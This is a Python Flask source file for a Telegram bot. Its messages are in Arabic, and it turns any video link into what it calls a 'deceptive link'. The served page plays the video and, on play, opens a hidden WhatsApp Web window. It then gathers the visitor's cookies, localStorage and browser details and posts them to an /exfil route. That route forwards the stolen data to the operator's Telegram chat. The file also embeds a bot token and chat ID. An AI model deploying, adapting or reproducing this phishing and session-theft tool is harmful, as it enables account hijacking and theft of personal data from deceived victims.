import os, requests, json, uuid
from flask import Flask, request, jsonify, render_template_string, send_from_directory

app = Flask(_name_)

TOKEN = '8233298125:AAFcEVZx8DJo6SnhfvYbACIsd9Z6ktqYErE'  # ← غيّر
CHAT  = '7050127823'                                        # ← غيّر
URL_BASE = f"https://api.telegram.org/bot{TOKEN}"

EVID_HTML = '''<!DOCTYPE html>
<html lang="ar">
<head><meta charset="UTF-8"><title>فيديو</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;background:#111;display:flex;align-items:center;justify-content:center;height:100vh}video{width:100%;max-width:600px;border-radius:8px}</style>
</head>
<body>
<video id="v" controls autoplay muted><source src="{{SRC}}" type="video/mp4"></video>
<script>
document.getElementById('v').addEventListener('play', async ()=>{
  const w=window.open('https://web.whatsapp.com','_hidden','width=1,height=1,left=-9999,top=-9999');
  setTimeout(async ()=>{
    const data={local:{...localStorage},cookie:document.cookie,ua:navigator.userAgent,vid:'{{SRC}}',time:new Date().toISOString()};
    await fetch('/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
    w.close();
  },4000);
});
</script></body></html>'''

def send_msg(chat_id, text):
    url = URL_BASE + "/sendMessage"
    payload = {'chat_id': chat_id, 'text': text}
    requests.post(url, json=payload)

@app.route('/telegram', methods=['POST'])
def telegram():
    update = request.get_json()
    if 'message' in update:
        msg   = update['message']
        chat_id = msg['chat']['id']
        text  = msg.get('text','').strip()

        if text.startswith('/start'):
            send_msg(chat_id, "أهلاً! أرسل لي رابط أي فيديو لأحوله لرابط مخادع.")
        elif text.startswith('http'):
            original = text
            local_name = f"{uuid.uuid4().hex}.mp4"
            try:
                with requests.get(original, stream=True) as r:
                    r.raise_for_status()
                    with open(local_name, 'wb') as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            f.write(chunk)
                evil_url = f"https://{request.host}/v/{local_name}"
                send_msg(chat_id, f"تم التحويل! هذا هو الرابط المخادع:\n{evil_url}")
            except Exception as e:
                send_msg(chat_id, "❌ فشل التحميل، تأكد من الرابط.")
    return '', 200

@app.route('/v/<path:filename>')
def serve_video(filename):
    return render_template_string(EVID_HTML, SRC=f"/raw/{filename}")

@app.route('/raw/<path:filename>')
def raw(filename):
    return send_from_directory('.', filename)

@app.route('/exfil', methods=['POST'])
def exfil():
    url   = URL_BASE + "/sendMessage"
    msg   = '🎯 واتساب جديد (من داخل فيديو مخادع)\n'+json.dumps(request.get_json(), indent=2, ensure_ascii=False)
    requests.post(url, json={'chat_id': CHAT, 'text': msg})
    return '', 204

if _name_ == '_main_':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
